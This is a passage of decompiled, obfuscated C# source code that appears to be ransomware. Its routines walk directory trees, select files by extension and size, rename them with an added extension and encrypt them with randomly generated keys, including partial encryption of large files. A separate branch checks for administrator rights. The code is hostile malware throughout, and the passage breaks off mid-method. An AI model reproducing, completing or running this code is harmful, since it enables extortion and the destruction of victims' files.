using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using vwkoAFlFxYAven;

namespace JNgWsfAJdq;

internal sealed class vjvaexovZfdCP
{
	public sealed class RwQdeHkmdAmEIvnFh
	{
		private static StringCollection AKXHVUtICYmCF;

		private static List<string> YVdibPUMVDJvVT;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107365916));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107365911)) && !text.ToLower().Contains(getString_0(107365922)) && !text.ToLower().Contains(getString_0(107352114)) && !text.ToLower().Contains(getString_0(107352133)) && !text.ToLower().Contains(getString_0(107365877)) && !text.ToLower().Contains(getString_0(107351981)) && !text.ToLower().Contains(getString_0(107351378)) && !text.ToLower().Contains(getString_0(107351393)) && !text.ToLower().Contains(getString_0(107351376)) && !text.ToLower().Contains(getString_0(107351327)) && !text.ToLower().Contains(getString_0(107351293)) && !text.ToLower().Contains(getString_0(107351308)) && !text.ToLower().Contains(getString_0(107351259)) && !text.ToLower().Contains(getString_0(107351278)) && !text.ToLower().Contains(getString_0(107351225)) && !text.ToLower().Contains(getString_0(107351244)) && !text.ToLower().Contains(getString_0(107351199)) && !text.ToLower().Contains(getString_0(107351214)) && !text.ToLower().Contains(getString_0(107351165)) && !text.Contains(OQNgkgiZsRBtM(getString_0(107351180))) && !text.Contains(getString_0(107351635)) && !text.Contains(getString_0(107351605)) && !text.EndsWith(getString_0(107395223)) && !text.EndsWith(getString_0(107351580)) && !text.EndsWith(getString_0(107351575)) && !text.EndsWith(getString_0(107351570)) && !text.EndsWith(getString_0(107351597)) && !text.ToLower().Contains(getString_0(107351592)) && !text.ToLower().Contains(GnVhnUOOYYhdqkV))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(zsGrHDUuxWs) * 1024.0 * 1024.0 && GuOreRpiLQap == getString_0(107396942))
							{
								YVdibPUMVDJvVT.Add(text);
							}
							else if (File.Exists(text) && GuOreRpiLQap == getString_0(107397160))
							{
								YVdibPUMVDJvVT.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return YVdibPUMVDJvVT;
		}

		static RwQdeHkmdAmEIvnFh()
		{
			Strings.CreateGetStringDelegate(typeof(RwQdeHkmdAmEIvnFh));
			AKXHVUtICYmCF = new StringCollection();
			YVdibPUMVDJvVT = new List<string>();
		}
	}

	private sealed class lvdaWWgpijusL
	{
		public string uqLfYDGWWaXz;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == uqLfYDGWWaXz;
		}
	}

	private sealed class AMQDQTwvKfC
	{
		private sealed class UuZcPnBXCAjuUv
		{
			public AMQDQTwvKfC njjRNeSzbquv;

			public string xeqwNQGVLHhKy;

			public void _003CCrypt_003Eb__20()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					JmshEryKedbtyz(WindowsIdentity.GetCurrent().Name, xeqwNQGVLHhKy);
				}
			}

			public void _003CCrypt_003Eb__21()
			{
				GyVKuLUBQJcKD(xeqwNQGVLHhKy, njjRNeSzbquv.tpQcxzxpPPrq, njjRNeSzbquv.HhtysrNNof, njjRNeSzbquv.WItDKQNxBvTmMKya, njjRNeSzbquv.mdgxQtpwwkbqMas);
			}
		}

		public string[] tpQcxzxpPPrq;

		public string[] WItDKQNxBvTmMKya;

		public string mdgxQtpwwkbqMas;

		public string HhtysrNNof;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1f(string string_0)
		{
			UuZcPnBXCAjuUv CS_0024_003C_003E8__locals0 = new UuZcPnBXCAjuUv();
			CS_0024_003C_003E8__locals0.njjRNeSzbquv = this;
			CS_0024_003C_003E8__locals0.xeqwNQGVLHhKy = string_0;
			if (BQmGsgiCrLkeXK && !EZwTDhvYAYNP().Contains(getString_0(107349241)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						JmshEryKedbtyz(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.xeqwNQGVLHhKy);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (wEAEiGEvbQBe == getString_0(107396948))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					GyVKuLUBQJcKD(CS_0024_003C_003E8__locals0.xeqwNQGVLHhKy, CS_0024_003C_003E8__locals0.njjRNeSzbquv.tpQcxzxpPPrq, CS_0024_003C_003E8__locals0.njjRNeSzbquv.HhtysrNNof, CS_0024_003C_003E8__locals0.njjRNeSzbquv.WItDKQNxBvTmMKya, CS_0024_003C_003E8__locals0.njjRNeSzbquv.mdgxQtpwwkbqMas);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				GyVKuLUBQJcKD(CS_0024_003C_003E8__locals0.xeqwNQGVLHhKy, tpQcxzxpPPrq, HhtysrNNof, WItDKQNxBvTmMKya, mdgxQtpwwkbqMas);
			}
		}

		static AMQDQTwvKfC()
		{
			Strings.CreateGetStringDelegate(typeof(AMQDQTwvKfC));
		}
	}

	private sealed class zMMiSiOLxsKC
	{
		private sealed class JUtHewjApebOeNyZs
		{
			public zMMiSiOLxsKC ikAVEYXdWFLemgx;

			public string EYLJWjtdbaGR;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2f()
			{
				try
				{
					if (UlBNnyiBkggp)
					{
						Console.WriteLine(getString_0(107365783) + EYLJWjtdbaGR + getString_0(107365246) + new FileInfo(EYLJWjtdbaGR).Length + getString_0(107365193));
						Console.WriteLine(getString_0(107365216), jehTyctIFoYNIp.Count, oNVtehkGXSvfD, slRUPIhEEasxMv);
						Console.WriteLine(getString_0(107365127), tFNHpewWORLeMw.Elapsed);
						Console.WriteLine(getString_0(107365102));
					}
				}
				catch
				{
				}
			}

			static JUtHewjApebOeNyZs()
			{
				Strings.CreateGetStringDelegate(typeof(JUtHewjApebOeNyZs));
			}
		}

		private sealed class fEeJrRiVizKd
		{
			public JUtHewjApebOeNyZs KIeINjRDmnbT;

			public zMMiSiOLxsKC ikAVEYXdWFLemgx;

			public string qzLjjzzlXxK;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__30()
			{
				foreach (string item in qGlQdkkhGGe)
				{
					if (qzLjjzzlXxK.ToLower().EndsWith(item + ikAVEYXdWFLemgx.EvGDFwQHbzXMTU) && pAghGHVkfTo == getString_0(107396963))
					{
						if (Convert.ToInt32(DPfofuVLHxlnIyh) * 1024 * 1024 > new FileInfo(qzLjjzzlXxK).Length)
						{
							try
							{
								fkiONJkXtes.ZBkgeKIejBXVf(getString_0(107352295), getString_0(107352322), getString_0(107352277), qzLjjzzlXxK);
							}
							catch
							{
							}
						}
					}
					else if (qzLjjzzlXxK.ToLower().EndsWith(item) && pAghGHVkfTo == getString_0(107397181))
					{
						try
						{
							fkiONJkXtes.ZBkgeKIejBXVf(getString_0(107352295), getString_0(107352322), getString_0(107352277), qzLjjzzlXxK);
						}
						catch
						{
						}
					}
				}
			}

			static fEeJrRiVizKd()
			{
				Strings.CreateGetStringDelegate(typeof(fEeJrRiVizKd));
			}
		}

		private sealed class GQoWgEQAMkRJ
		{
			public zMMiSiOLxsKC ikAVEYXdWFLemgx;

			public string EYLJWjtdbaGR;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__32()
			{
				try
				{
					if (UlBNnyiBkggp)
					{
						Console.WriteLine(getString_0(107365790) + EYLJWjtdbaGR + getString_0(107365253) + new FileInfo(EYLJWjtdbaGR).Length + getString_0(107365200));
						Console.WriteLine(getString_0(107365223), jehTyctIFoYNIp.Count, oNVtehkGXSvfD, slRUPIhEEasxMv);
						Console.WriteLine(getString_0(107365134), tFNHpewWORLeMw.Elapsed);
						Console.WriteLine(getString_0(107365109));
					}
				}
				catch
				{
				}
			}

			public void _003CWorkerCrypter2_003Eb__33()
			{
				foreach (string item in qGlQdkkhGGe)
				{
					if (EYLJWjtdbaGR.ToLower().EndsWith(item + ikAVEYXdWFLemgx.EvGDFwQHbzXMTU) && pAghGHVkfTo == getString_0(107396966))
					{
						if (Convert.ToInt32(DPfofuVLHxlnIyh) * 1024 * 1024 > new FileInfo(EYLJWjtdbaGR).Length)
						{
							try
							{
								fkiONJkXtes.ZBkgeKIejBXVf(getString_0(107352298), getString_0(107352325), getString_0(107352280), EYLJWjtdbaGR);
							}
							catch
							{
							}
						}
					}
					else if (EYLJWjtdbaGR.ToLower().EndsWith(item) && pAghGHVkfTo == getString_0(107397184))
					{
						try
						{
							fkiONJkXtes.ZBkgeKIejBXVf(getString_0(107352298), getString_0(107352325), getString_0(107352280), EYLJWjtdbaGR);
						}
						catch
						{
						}
					}
				}
			}

			static GQoWgEQAMkRJ()
			{
				Strings.CreateGetStringDelegate(typeof(GQoWgEQAMkRJ));
			}
		}

		public List<string> BupWADfZez;

		public List<string> hfUdwvPqriEs;

		public string EvGDFwQHbzXMTU;

		public string[] UYtVQBGvNFN;

		public string foDfHTmkRAByYW;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2e(string string_0)
		{
			using List<string>.Enumerator enumerator = hfUdwvPqriEs.GetEnumerator();
			fEeJrRiVizKd CS_0024_003C_003E8__locals0;
			while (enumerator.MoveNext())
			{
				JUtHewjApebOeNyZs CS_0024_003C_003E8__locals1 = new JUtHewjApebOeNyZs();
				CS_0024_003C_003E8__locals1.ikAVEYXdWFLemgx = this;
				CS_0024_003C_003E8__locals1.EYLJWjtdbaGR = enumerator.Current;
				if (UYtVQBGvNFN.Length != 0)
				{
					string[] uYtVQBGvNFN = UYtVQBGvNFN;
					int num = 0;
					while (num < uYtVQBGvNFN.Length)
					{
						string value = uYtVQBGvNFN[num];
						if (!CS_0024_003C_003E8__locals1.EYLJWjtdbaGR.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_08c7;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals1.EYLJWjtdbaGR.EndsWith(EvGDFwQHbzXMTU))
					{
						goto IL_08c7;
					}
				}
				catch (Exception)
				{
					goto IL_08c7;
				}
				if (!CS_0024_003C_003E8__locals1.EYLJWjtdbaGR.EndsWith(string_0) || jehTyctIFoYNIp.Contains(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR))
				{
					continue;
				}
				if (iGHIvdzAxB == getString_0(107396956))
				{
					try
					{
						if (uTemtccfmqlz.LQwWDAYgIIgx(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR))
						{
							uTemtccfmqlz.bplRcjkgXsd(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR);
						}
					}
					catch
					{
					}
				}
				jehTyctIFoYNIp.Add(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (UlBNnyiBkggp)
						{
							Console.WriteLine(JUtHewjApebOeNyZs.getString_0(107365783) + CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + JUtHewjApebOeNyZs.getString_0(107365246) + new FileInfo(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR).Length + JUtHewjApebOeNyZs.getString_0(107365193));
							Console.WriteLine(JUtHewjApebOeNyZs.getString_0(107365216), jehTyctIFoYNIp.Count, oNVtehkGXSvfD, slRUPIhEEasxMv);
							Console.WriteLine(JUtHewjApebOeNyZs.getString_0(107365127), tFNHpewWORLeMw.Elapsed);
							Console.WriteLine(JUtHewjApebOeNyZs.getString_0(107365102));
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!nWxaVjFaAUH.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR)))
				{
					nWxaVjFaAUH.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR));
				}
				KKPEHOUPlrnQr(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (mLogOAlXxCGZma)
						{
							try
							{
								File.AppendAllText(PuxbPamNEvKf, getString_0(107349895) + CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + getString_0(107365906) + ex2.Message + getString_0(107396630));
							}
							catch (Exception)
							{
							}
						}
						slRUPIhEEasxMv++;
						goto end_IL_0175;
					}
					if (jJEHaHJsPqMKE == getString_0(107396956) && new FileInfo(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR).Length > Convert.ToInt32(ySwjQogNty) * 1024 * 1024 && !BupWADfZez.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new fEeJrRiVizKd();
						CS_0024_003C_003E8__locals0.KIeINjRDmnbT = CS_0024_003C_003E8__locals1;
						CS_0024_003C_003E8__locals0.ikAVEYXdWFLemgx = this;
						try
						{
							if (EvGDFwQHbzXMTU != getString_0(107349127))
							{
								if (EovHtqNdKKIO)
								{
									EvGDFwQHbzXMTU = SNoRzClPbgpw + EvGDFwQHbzXMTU;
								}
								File.Move(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + EvGDFwQHbzXMTU);
							}
						}
						catch (Exception ex4)
						{
							if (mLogOAlXxCGZma)
							{
								try
								{
									File.AppendAllText(PuxbPamNEvKf, getString_0(107349895) + CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + getString_0(107365845) + ex4.Message + getString_0(107396630));
								}
								catch (Exception)
								{
								}
							}
							slRUPIhEEasxMv++;
							goto end_IL_0175;
						}
						CS_0024_003C_003E8__locals0.qzLjjzzlXxK = getString_0(107352239);
						if (EvGDFwQHbzXMTU != getString_0(107349127))
						{
							CS_0024_003C_003E8__locals0.qzLjjzzlXxK = CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + EvGDFwQHbzXMTU;
						}
						else
						{
							CS_0024_003C_003E8__locals0.qzLjjzzlXxK = CS_0024_003C_003E8__locals1.EYLJWjtdbaGR;
						}
						if (uOaGmGyltMwB == getString_0(107396956))
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item in qGlQdkkhGGe)
								{
									if (CS_0024_003C_003E8__locals0.qzLjjzzlXxK.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.ikAVEYXdWFLemgx.EvGDFwQHbzXMTU) && pAghGHVkfTo == fEeJrRiVizKd.getString_0(107396963))
									{
										if (Convert.ToInt32(DPfofuVLHxlnIyh) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.qzLjjzzlXxK).Length)
										{
											try
											{
												fkiONJkXtes.ZBkgeKIejBXVf(fEeJrRiVizKd.getString_0(107352295), fEeJrRiVizKd.getString_0(107352322), fEeJrRiVizKd.getString_0(107352277), CS_0024_003C_003E8__locals0.qzLjjzzlXxK);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.qzLjjzzlXxK.ToLower().EndsWith(item) && pAghGHVkfTo == fEeJrRiVizKd.getString_0(107397181))
									{
										try
										{
											fkiONJkXtes.ZBkgeKIejBXVf(fEeJrRiVizKd.getString_0(107352295), fEeJrRiVizKd.getString_0(107352322), fEeJrRiVizKd.getString_0(107352277), CS_0024_003C_003E8__locals0.qzLjjzzlXxK);
										}
										catch
										{
										}
									}
								}
							});
							thread2.Priority = ThreadPriority.Normal;
							thread2.IsBackground = false;
							thread2.Start();
						}
						string text = CPOlMgiMtrt.qfsgcgZBmwQ(32);
						string s = ZrbAiQSenEN.PvVgiztDRoWbhs(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (ZapXHYEcfcRlj == getString_0(107397174))
						{
							byte[] array = null;
							byte[] byte_ = bQwLemggMIXO.JPoqfLkNbop(CS_0024_003C_003E8__locals0.qzLjjzzlXxK, Convert.ToInt32(ySwjQogNty) * 1024 * 1024);
							bQwLemggMIXO.feLfHlEZaImINg(gfVWmhJNzzTr: (!tbUmPYlAGHV) ? (XuGnEkReQEL ? bQwLemggMIXO.FIiJNguIBznfy(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : bQwLemggMIXO.FIiJNguIBznfy(byte_, Encoding.ASCII.GetBytes(foDfHTmkRAByYW), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (XuGnEkReQEL ? idTumjwtCKpZx.hLiqKlBgJzHKEXvg(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : idTumjwtCKpZx.hLiqKlBgJzHKEXvg(byte_, Encoding.ASCII.GetBytes(foDfHTmkRAByYW), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), UJrBcShqTfC: CS_0024_003C_003E8__locals0.qzLjjzzlXxK, UzwiGYbBhSc: bytes);
						}
						else if (!XuGnEkReQEL)
						{
							OtwBgoVUjwmos.PDnoxZCfZtLYh(CS_0024_003C_003E8__locals0.qzLjjzzlXxK, ySwjQogNty, foDfHTmkRAByYW);
						}
						else
						{
							OtwBgoVUjwmos.PDnoxZCfZtLYh(CS_0024_003C_003E8__locals0.qzLjjzzlXxK, ySwjQogNty, text, bytes);
						}
					}
					else
					{
						if (EovHtqNdKKIO)
						{
							EvGDFwQHbzXMTU = SNoRzClPbgpw + EvGDFwQHbzXMTU;
						}
						string text2 = CPOlMgiMtrt.qfsgcgZBmwQ(32);
						string s2 = ZrbAiQSenEN.PvVgiztDRoWbhs(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (EvGDFwQHbzXMTU != getString_0(107349127))
						{
							if (!SeGgjnhvEXrLE)
							{
								if (!XuGnEkReQEL)
								{
									bEqndNQCJNJKtx(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + EvGDFwQHbzXMTU, MrSCMslRwDw);
								}
								else
								{
									bEqndNQCJNJKtx(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + EvGDFwQHbzXMTU, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!XuGnEkReQEL)
									{
										BwaaJjHcbeJUZT(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + EvGDFwQHbzXMTU, MrSCMslRwDw);
									}
									else
									{
										BwaaJjHcbeJUZT(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + EvGDFwQHbzXMTU, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (mLogOAlXxCGZma)
									{
										try
										{
											File.AppendAllText(PuxbPamNEvKf, getString_0(107349895) + CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + getString_0(107349145) + ex6.Message + getString_0(107396630));
										}
										catch (Exception)
										{
										}
									}
									slRUPIhEEasxMv++;
									goto end_IL_0175;
								}
							}
						}
						else if (!SeGgjnhvEXrLE)
						{
							if (!XuGnEkReQEL)
							{
								bEqndNQCJNJKtx(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + getString_0(107349122), MrSCMslRwDw);
							}
							else
							{
								bEqndNQCJNJKtx(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + getString_0(107349122), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!XuGnEkReQEL)
								{
									BwaaJjHcbeJUZT(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, MrSCMslRwDw);
								}
								else
								{
									BwaaJjHcbeJUZT(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (mLogOAlXxCGZma)
								{
									try
									{
										File.AppendAllText(PuxbPamNEvKf, getString_0(107349895) + CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + getString_0(107349145) + ex8.Message + getString_0(107396630));
									}
									catch (Exception)
									{
									}
								}
								slRUPIhEEasxMv++;
								goto end_IL_0175;
							}
						}
						if (XuGnEkReQEL)
						{
							if (EvGDFwQHbzXMTU != getString_0(107349127))
							{
								sVisjIxCcpCfhZ(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR + EvGDFwQHbzXMTU, bytes2);
							}
							else
							{
								sVisjIxCcpCfhZ(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR, bytes2);
							}
						}
					}
					goto IL_08c7;
					end_IL_0175:;
				}
				catch (Exception)
				{
					goto IL_08c7;
				}
				continue;
				IL_08c7:
				hfUdwvPqriEs.Remove(CS_0024_003C_003E8__locals1.EYLJWjtdbaGR);
			}
		}

		public void _003CWorkerCrypter2_003Eb__31(string string_0)
		{
			GQoWgEQAMkRJ CS_0024_003C_003E8__locals0 = new GQoWgEQAMkRJ();
			CS_0024_003C_003E8__locals0.ikAVEYXdWFLemgx = this;
			CS_0024_003C_003E8__locals0.EYLJWjtdbaGR = string_0;
			if (UYtVQBGvNFN.Length != 0)
			{
				string[] uYtVQBGvNFN = UYtVQBGvNFN;
				int num = 0;
				while (num < uYtVQBGvNFN.Length)
				{
					string value = uYtVQBGvNFN[num];
					if (!CS_0024_003C_003E8__locals0.EYLJWjtdbaGR.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0842;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.EYLJWjtdbaGR.EndsWith(EvGDFwQHbzXMTU))
				{
					goto IL_0842;
				}
			}
			catch (Exception)
			{
				goto IL_0842;
			}
			if (!jehTyctIFoYNIp.Contains(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR))
			{
				if (iGHIvdzAxB == getString_0(107396956))
				{
					try
					{
						if (uTemtccfmqlz.LQwWDAYgIIgx(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR))
						{
							uTemtccfmqlz.bplRcjkgXsd(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR);
						}
					}
					catch
					{
					}
				}
				jehTyctIFoYNIp.Add(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (UlBNnyiBkggp)
						{
							Console.WriteLine(GQoWgEQAMkRJ.getString_0(107365790) + CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + GQoWgEQAMkRJ.getString_0(107365253) + new FileInfo(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR).Length + GQoWgEQAMkRJ.getString_0(107365200));
							Console.WriteLine(GQoWgEQAMkRJ.getString_0(107365223), jehTyctIFoYNIp.Count, oNVtehkGXSvfD, slRUPIhEEasxMv);
							Console.WriteLine(GQoWgEQAMkRJ.getString_0(107365134), tFNHpewWORLeMw.Elapsed);
							Console.WriteLine(GQoWgEQAMkRJ.getString_0(107365109));
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!nWxaVjFaAUH.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR)))
				{
					nWxaVjFaAUH.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR));
				}
				KKPEHOUPlrnQr(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR).Length != 0L)
						{
							goto end_IL_0142;
						}
						goto end_IL_0142_2;
						end_IL_0142:;
					}
					catch (Exception ex2)
					{
						if (mLogOAlXxCGZma)
						{
							try
							{
								File.AppendAllText(PuxbPamNEvKf, getString_0(107349895) + CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + getString_0(107365906) + ex2.Message + getString_0(107396630));
							}
							catch (Exception)
							{
							}
						}
						slRUPIhEEasxMv++;
						goto end_IL_0142_2;
					}
					if (jJEHaHJsPqMKE == getString_0(107396956) && new FileInfo(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR).Length > Convert.ToInt32(ySwjQogNty) * 1024 * 1024)
					{
						try
						{
							if (EvGDFwQHbzXMTU != getString_0(107349127))
							{
								if (EovHtqNdKKIO)
								{
									EvGDFwQHbzXMTU = SNoRzClPbgpw + EvGDFwQHbzXMTU;
								}
								File.Move(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + EvGDFwQHbzXMTU);
							}
						}
						catch (Exception ex4)
						{
							if (mLogOAlXxCGZma)
							{
								try
								{
									File.AppendAllText(PuxbPamNEvKf, getString_0(107349895) + CS_0024_003C_003E8__locals0.EYLJWjtdbaGR + getString_0(107365845) + ex4.Message + getString_0(107396630));
								}
								catch (Exception)
								{
								}
							}
							slRUPIhEEasxMv++;
							return;
						}
						if (EvGDFwQHbzXMTU != getString_0(107349127))
						{
							CS_0024_003C_003E8__locals0.EYLJWjtdbaGR += EvGDFwQHbzXMTU;
						}
						if (uOaGmGyltMwB == getString_0(107396956))
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item in qGlQdkkhGGe)
								{
									if (CS_0024_003C_003E8__locals0.EYLJWjtdbaGR.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.ikAVEYXdWFLemgx.EvGDFwQHbzXMTU) && pAghGHVkfTo == GQoWgEQAMkRJ.getString_0(107396966))
									{
										if (Convert.ToInt32(DPfofuVLHxlnIyh) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR).Length)
										{
											try
											{
												fkiONJkXtes.ZBkgeKIejBXVf(GQoWgEQAMkRJ.getString_0(107352298), GQoWgEQAMkRJ.getString_0(107352325), GQoWgEQAMkRJ.getString_0(107352280), CS_0024_003C_003E8__locals0.EYLJWjtdbaGR);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.EYLJWjtdbaGR.ToLower().EndsWith(item) && pAghGHVkfTo == GQoWgEQAMkRJ.getString_0(107397184))
									{
										try
										{
											fkiONJkXtes.ZBkgeKIejBXVf(GQoWgEQAMkRJ.getString_0(107352298), GQoWgEQAMkRJ.getString_0(107352325), GQoWgEQAMkRJ.getString_0(107352280), CS_0024_003C_003E8__locals0.EYLJWjtdbaGR);
										}
										catch
										{
										}
									}
								}
							});
							thread2.IsBackground = false;
							thread2.Priority = ThreadPriority.Normal;
							thread2.Start();
						}
						string text = CPOlMgiMtrt.qfsgcgZBmwQ(32);
						string s = ZrbAiQSenEN.PvVgiztDRoWbhs(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (ZapXHYEcfcRlj == getString_0(107397174))
						{
							byte[] array = null;
							byte[] byte_ = bQwLemggMIXO.JPoqfLkNbop(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, Convert.ToInt32(ySwjQogNty) * 1024 * 1024);
							bQwLemggMIXO.feLfHlEZaImINg(gfVWmhJNzzTr: (!tbUmPYlAGHV) ? (XuGnEkReQEL ? bQwLemggMIXO.FIiJNguIBznfy(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : bQwLemggMIXO.FIiJNguIBznfy(byte_, Encoding.ASCII.GetBytes(foDfHTmkRAByYW), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (XuGnEkReQEL ? idTumjwtCKpZx.hLiqKlBgJzHKEXvg(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : idTumjwtCKpZx.hLiqKlBgJzHKEXvg(byte_, Encoding.ASCII.GetBytes(foDfHTmkRAByYW), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), UJrBcShqTfC: CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, UzwiGYbBhSc: bytes);
						}
						else if (!XuGnEkReQEL)
						{
							OtwBgoVUjwmos.PDnoxZCfZtLYh(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, ySwjQogNty, foDfHTmkRAByYW);
						}
						else
						{
							OtwBgoVUjwmos.PDnoxZCfZtLYh(CS_0024_003C_003E8__locals0.EYLJWjtdbaGR, ySwjQogNty, text, bytes);
						}
					}
					else
					{
						if (EovHtqNdKKIO)
						{
